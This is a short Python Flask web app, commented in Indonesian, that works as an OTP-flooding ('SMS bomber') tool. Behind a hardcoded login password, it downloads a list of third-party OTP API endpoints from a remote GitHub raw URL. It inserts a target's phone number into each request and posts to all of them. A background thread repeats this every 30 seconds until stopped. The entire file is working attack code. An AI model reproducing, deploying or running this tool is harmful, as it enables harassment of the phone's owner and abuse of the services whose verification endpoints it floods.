from flask import Flask, render_template, request, redirect, url_for, flash
import requests
import threading
import time

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Password yang diizinkan
ALLOWED_PASSWORD = 'Yosepckp'
# URL GitHub Raw untuk file JSON konfigurasi OTP
JSON_CONFIG_URL = "https://raw.githubusercontent.com/YoshCasaster/verifikasi-sotp/main/otp_config.json"

# Variabel untuk kontrol pengiriman
loop_running = False
stop_event = threading.Event()

# Fungsi untuk mengirim OTP
def send_otp_requests(phone_number):
    responses = []
    try:
        response = requests.get(JSON_CONFIG_URL)
        config = response.json()

        for item in config:
            api_url = item.get("url")
            data = item.get("data").replace("target_number", phone_number)
            headers = item.get("headers")
            response = requests.post(api_url, headers=headers, data=data)
            responses.append(response.text)
        return responses
    except Exception as e:
        return [f"Gagal mengambil konfigurasi OTP: {e}"]

# Fungsi untuk pengiriman berulang
def send_otp_loop(phone_number):
    global loop_running
    loop_running = True
    while loop_running:
        otp_responses = send_otp_requests(phone_number)
        print(otp_responses)  # Ganti dengan logging jika perlu
        time.sleep(30)  # Tunggu 30 detik sebelum mengirim ulang

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        password = request.form['password']
        if password == ALLOWED_PASSWORD:
            return render_template('home.html', key_valid=True)  # Tampilkan halaman utama
        else:
            flash('Password salah, silakan coba lagi.')
            return redirect(url_for('home'))

    return render_template('login.html')  # Tampilkan halaman login

@app.route('/otp', methods=['POST'])
def otp():
    global loop_running
    phone_number = request.form['phone']
    if not loop_running:
        threading.Thread(target=send_otp_loop, args=(phone_number,), daemon=True).start()
    return redirect(url_for('home'))

@app.route('/stop', methods=['POST'])
def stop():
    global loop_running
    loop_running = False
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)
